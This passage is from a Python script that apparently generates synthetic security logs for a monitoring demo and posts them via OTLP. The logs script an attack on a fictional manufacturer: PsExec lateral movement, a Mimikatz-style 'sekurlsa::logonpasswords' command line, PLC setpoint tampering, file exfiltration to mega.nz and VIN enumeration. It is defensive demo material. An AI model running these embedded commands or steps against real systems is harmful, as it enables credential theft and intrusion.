    at(17.1, "secdemo-ad", "WARN", {"event_id": 4624, "event_name": "An account was successfully logged on", "logon_type": 3,
                                    "user": "ot_admin", "src_host": ews, "src_ip": ews_ip, "dst_host": hmi, **ad_common})
    at(17.15, "secdemo-ad", "WARN", {"event_id": 4672, "event_name": "Special privileges assigned to new logon",
                                     "user": "ot_admin", "src_host": ews, "dst_host": hmi,
                                     "privileges": "SeDebugPrivilege SeTakeOwnershipPrivilege", **ad_common})
    at(17.2, "secdemo-ad", "ERROR", {"event_id": 7045, "event_name": "A service was installed in the system",
                                     "user": "ot_admin", "src_host": ews, "dst_host": hmi, "service": "PSEXESVC",
                                     "service_file": "%SystemRoot%\\PSEXESVC.exe", **ad_common})
    at(17.3, "secdemo-edr", "ERROR", {
        "event_type": "Detection", "detection_name": "Remote service execution via PsExec", "severity": "high",
        "tactic": "Lateral Movement", "technique_id": "T1021.002", "technique": "SMB/Windows Admin Shares",
        "action": "allowed", "host": hmi, "host_ip": hmi_ip, "user": "ot_admin", "site": "riverside-assembly",
        "process": "PSEXESVC.exe", "parent_process": "services.exe", "cmdline": "cmd.exe /c whoami & ipconfig /all & net share",
        "sha256": sha("psexesvc")})
    for i in range(60):
        at(16 + i * 0.02, "secdemo-firewall", "WARN", {
            "src_ip": ews_ip, "src_host": ews, "src_zone": "ot-cell", "dst_zone": "ot-cell",
            "dst_ip": f"172.16.{r.choice([11, 12, 13])}.{r.randrange(30, 90)}", "dst_port": r.choice([102, 44818, 502, 2222]),
            "proto": "tcp", "app": "incomplete", "action": "deny", "rule": "ot-cell-isolation", "bytes": 74,
            "fw": "pa-rva-ot01", "site": "riverside-assembly"})
    at(16.2, "secdemo-edr", "FATAL", {
        "event_type": "Detection", "detection_name": "LSASS memory access by unsigned process", "severity": "critical",
        "tactic": "Credential Access", "technique_id": "T1003.001", "technique": "LSASS Memory", "action": "allowed",
        "host": ews, "host_ip": ews_ip, "user": v["user"], "site": "riverside-assembly", "process": "svcupd.exe",
        "parent_process": "cmd.exe", "cmdline": "svcupd.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
        "sha256": sha("mimi")})
    # 18: OT impact
    plc = "PLC-PAINT-L2-07"
    for m, ev, sev, desc, tech in [
        (18, "controller_mode_change", "high", "Controller mode changed RUN -> PROGRAM", "T0858"),
        (18.3, "program_download", "critical", "Program download outside change window, unsigned block OB35 modified", "T0843"),
        (18.8, "write_request", "high", "Setpoint write: OVEN_ZONE3_TEMP 182C -> 240C", "T0836"),
        (19.2, "controller_mode_change", "high", "Controller mode changed PROGRAM -> RUN", "T0858"),
        (19.5, "new_asset", "medium", "New asset observed: unknown OUI on PAINT-L2 cell switch", "T0848"),
    ]:
        at(m, "secdemo-ot", "ERROR" if sev in ("critical", "high") else "WARN", {
            "event_type": ev, "site": "riverside-assembly", "ot_line": "PAINT-L2", "asset": plc, "asset_ip": "172.16.12.47",
            "vendor": "Siemens", "model": "S7-1500", "protocol": "S7comm", "src_host": ews, "src_ip": ews_ip,
            "severity": sev, "change_window": False, "change_ticket": "", "description": desc,
            "technique_id": tech, "user": v["user"]})
    # 20: exfil of EV CAD via proxy
    for i in range(40):
        at(20 + i * 0.12, "secdemo-proxy", "WARN", {
            "user": v["user"], "host": vh, "src_ip": vip, "url_domain": "mega.nz", "category": "file-sharing",
            "method": "POST", "bytes_out": 60_000_000 + r.randrange(0, 2_000_000), "bytes_in": 2100, "status": 200,
            "action": "allow", "site": v["site"], "file_name": "EVP3_battery_pack_rev7.7z.%03d" % i})
    at(20, "secdemo-ad", "INFO", {"event_id": 5145, "event_name": "A network share object was checked for access",
                                  "user": v["user"], "src_ip": vip, "share": "\\\\FS-NTC-CAD\\EV-Platform-Gen3",
                                  "dc": "FS-NTC-CAD", "dc_ip": SERVERS["FS-NTC-CAD"][0], "domain": "HALVORSEN",
                                  "site": DATACENTER, "relative_target": "battery\\pack_rev7"})
    # 22: telematics key abuse (VIN enumeration)
    for i in range(400):
        st = 404 if r.random() < 0.88 else 200
        ep = "/v2/vehicles/{vin}/location"
        meth = "GET"
        if i % 50 == 49:
            ep, meth, st = "/v2/vehicles/{vin}/remote/unlock", "POST", 403
        vin = "5HV" + "".join(r.choice("ABCDEFGHJKLMNPRSTUVWXYZ0123456789") for _ in range(14))
        at(22 + i * 0.012, "secdemo-telematics", "WARN" if st >= 400 else "INFO", {
            "client_id": "fleet-partner-07", "api_key_id": "ak_fleetpartner07", "method": meth, "endpoint": ep,
            "vin": vin, "status": st, "latency_ms": int(r.lognormvariate(3.6, 0.3)), "src_ip": TELEMATICS_ABUSE_IP,
            "gateway": "apigw-telematics-us"})
    # 28: response
    at(28, "secdemo-edr", "WARN", {"event_type": "Containment", "detection_name": "Host network-contained by analyst",
                                   "severity": "medium", "tactic": "", "technique_id": "", "technique": "", "action": "contained",
                                   "host": vh, "host_ip": vip, "user": "soc.tier2", "site": v["site"], "process": "",
                                   "parent_process": "", "cmdline": "", "sha256": ""})
    at(28.5, "secdemo-idp", "WARN", {"event_type": "user.session.revoke", "user": v["user"], "dept": v["dept"],
                                     "app": "ALL", "src_ip": "", "src_country": "", "src_city": "", "site": v["site"],
                                     "outcome": "SUCCESS", "reason": "admin_revoked_by_soc", "mfa_factor": "",
                                     "risk_level": "HIGH", "user_agent": ""})
    return out


def otlp_payload(records):
    by_svc = {}
    for ts, svc, sev, body in records:
        by_svc.setdefault(svc, []).append({
            "timeUnixNano": str(int(ts * 1e9)), "observedTimeUnixNano": str(int(ts * 1e9)),
            "severityText": sev, "severityNumber": SEV_NUM[sev],
            "body": {"stringValue": json.dumps(body, separators=(",", ":"))},
            "attributes": [{"key": "log.source", "value": {"stringValue": svc.replace("secdemo-", "")}}],
        })
    rl = []
    for svc, recs in by_svc.items():
        rl.append({"resource": {"attributes": [
            {"key": "service.name", "value": {"stringValue": svc}},
            {"key": "service.namespace", "value": {"stringValue": NS}},
            {"key": "deployment.environment", "value": {"stringValue": "demo"}},
        ]}, "scopeLogs": [{"scope": {"name": "secgen", "version": "1"}, "logRecords": recs}]})
    return {"resourceLogs": rl}


def send(cfg, records, dry=False):
    if not records:
        return
    if dry:
        for rec in records[:5]:
            print(rec[1], rec[2], json.dumps(rec[3])[:200])
        return
    data = json.dumps(otlp_payload(records)).encode()
    auth = base64.b64encode(f"{cfg['GC_OTLP_ACCOUNT']}:{cfg['GC_OTLP_KEY']}".encode()).decode()
    req = urllib.request.Request(cfg["GC_OTLP_URL"].rstrip("/") + "/v1/logs", data=data, method="POST",
                                 headers={"Content-Type": "application/json", "Authorization": "Basic " + auth})
    for attempt in range(5):
        try:
            with urllib.request.urlopen(req, timeout=30) as resp:
                if resp.status < 300:
                    return
        except Exception as e:  # noqa: BLE001
            print(f"send failed ({len(records)} recs): {e}", file=sys.stderr, flush=True)
            time.sleep(2 ** attempt)


def load_env(path):
    cfg = {}
    with open(path) as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#") or "=" not in line:
                continue
            k, v = line.split("=", 1)
            cfg[k.strip()] = v.strip().strip('"').strip("'")
    for k in ("GC_OTLP_URL", "GC_OTLP_ACCOUNT", "GC_OTLP_KEY"):
        cfg[k] = os.environ.get(k, cfg.get(k, ""))
        if not cfg[k]:
            sys.exit(f"missing {k}")
    return cfg


def window(gen, t0, t1, period, scale):
    """All records with t0 <= ts < t1, sorted."""
    recs = []
    for name, rate in RATES.items():
        fn = getattr(gen, name)
        n = gen.r.gauss(rate * scale * (t1 - t0), math.sqrt(max(rate * scale * (t1 - t0), 1)))
        for _ in range(max(0, int(round(n)))):
            ts = gen.r.uniform(t0, t1)
            recs.append((ts,) + fn(ts))
    c0 = int(t0 // period)
    c1 = int(t1 // period)
    for c in range(c0 - 1, c1 + 1):
        for rec in scenario(c * period, c):
            if t0 <= rec[0] < t1:
                recs.append(rec)
    recs.sort(key=lambda x: x[0])
    return recs


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--env-file", default=os.path.expanduser("~/network-o11y-demo/local/.env"))
    ap.add_argument("--backfill-hours", type=float, default=0)
    ap.add_argument("--rate-scale", type=float, default=float(os.environ.get("SECGEN_RATE_SCALE", "1")))
    ap.add_argument("--period-min", type=float, default=float(os.environ.get("SCENARIO_PERIOD_MIN", "60")))
    ap.add_argument("--dry-run", action="store_true")
    ap.add_argument("--once", action="store_true", help="send one live tick and exit")
    a = ap.parse_args()
    cfg = {} if a.dry_run else load_env(a.env_file)
    period = a.period_min * 60
    gen = Gen()
    now = time.time()
    if a.backfill_hours > 0:
        t = now - a.backfill_hours * 3600
        step = 300
        total = 0
        while t < now:
            t1 = min(t + step, now)
            recs = window(gen, t, t1, period, a.rate_scale)
            for i in range(0, len(recs), 3000):
                send(cfg, recs[i:i + 3000], a.dry_run)
            total += len(recs)
            t = t1
        print(f"backfilled {total} records over {a.backfill_hours}h", flush=True)
        now = t
    last = now
    sent = 0
    report = time.time()
    while True:
        time.sleep(2)
        t1 = time.time()
        recs = window(gen, last, t1, period, a.rate_scale)
        send(cfg, recs, a.dry_run)
        sent += len(recs)
        last = t1
        if a.once:
            print(f"sent {sent}")
            return
        if t1 - report > 300:
            print(f"{time.strftime('%H:%M:%S')} sent {sent} records in last {int(t1 - report)}s; "
                  f"cycle minute {((t1 % period) / 60):.1f}", flush=True)
            sent = 0
            report = t1


if __name__ == "__main__":
    main()
